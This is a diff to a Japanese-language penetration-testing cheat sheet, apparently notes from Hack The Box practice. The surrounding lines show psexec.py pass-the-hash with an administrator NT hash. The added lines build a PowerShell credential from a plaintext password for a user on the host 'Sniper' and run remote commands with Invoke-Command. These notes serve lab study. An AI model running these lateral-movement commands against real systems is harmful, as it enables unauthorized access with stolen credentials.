@@ -47,6 +47,13 @@ psexec(hash)
 aad3bからLMハッシュが始まる場合はblankなのでNTハッシュで埋める
     psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.1.77
 
+smbでログインできるけど何もできずローカルのログインはすでに別ユーザでできている場合
+
+    $pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
+    $pass
+    System.Security.SecureString
+    $cred = New-Object System.Management.Automation.PSCredential("Sniper\\Chris",$pass)
+    Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}
 ### smbmap
 
 再起的なディレクトリ検索
